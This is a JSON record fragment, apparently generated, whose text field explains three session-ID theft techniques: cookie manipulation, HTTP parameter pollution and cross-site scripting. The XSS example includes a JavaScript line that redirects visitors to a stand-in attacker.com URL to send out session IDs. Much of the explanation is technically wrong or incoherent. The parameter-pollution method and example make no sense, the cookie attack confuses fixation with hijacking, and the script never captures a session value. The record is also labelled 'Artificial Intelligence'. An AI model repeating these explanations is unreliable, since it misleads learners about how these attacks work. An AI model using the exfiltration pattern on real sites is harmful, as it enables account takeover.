      "topic": "Artificial Intelligence",
      "subtopic": "**Web Application Security**\n\nHere’s a breakdown of three distinct methods used in web server attacks to steal session IDs and gain unauthorized access, each with a brief example:\n\n1.  **Session Hijacking via Cookie Manipulation:** This technique exploits vulnerabilities in how cookies are handled, allowing attackers to steal session IDs and impersonate legitimate users.\n\n    *   **Method:** Attackers inject malicious cookies with identical or subtly altered session IDs.  They then use these cookies to hijack the user’s session, effectively gaining access to the user’s account.\n    *   **Example:**  An attacker injects a cookie containing a stolen session ID into a user’s session.  When the user accesses the website, the browser automatically uses the attacker’s session ID instead of the user's, allowing them to log in as the user.\n\n2.  **HTTP Parameter Pollution (HPP) Exploitation:** This method leverages the browser's ability to handle multiple parameters in HTTP requests and allows attackers to inject malicious parameters that reveal session IDs.\n\n    *   **Method:**  Attackers insert a specially crafted parameter in the URL, such as `?session_id=attacker` or `?session_id=secret`.  The browser then interprets this parameter as a session ID and passes it to the server.\n    *   **Example:**  A user visits a website with a URL like `example.com/profile?session_id=user123`.  An attacker inserts `?session_id=user123` in the URL.  The browser interprets this as a session ID and sends it to the server.\n\n3.  **Cross-Site Scripting (XSS) + Session ID Theft:** This combines a vulnerability with a targeted attack.  Attackers inject malicious JavaScript code into a website, which then steals session IDs when the user interacts with the compromised page.\n\n    *   **Method:**  The attacker injects JavaScript code that subtly modifies the page's URL or attributes. When the user visits the modified page, the JavaScript code then extracts the session ID from the URL or other relevant attributes.\n    *   **Example:** An attacker injects JavaScript into a blog post on a website.  The JavaScript code contains a message like `window.location.href = \"https://attacker.com/steal?session_id=\";`.  When a user visits the blog post, the browser follows the link and sends the session ID to the attacker.\n\n\n\n**Why Web Application Security?**\n\nThis subtopic directly relates to the core of web server security, as web servers are frequently the primary targets for these attacks.  Understanding these methods is critical for implementing effective defenses against web-based attacks.",
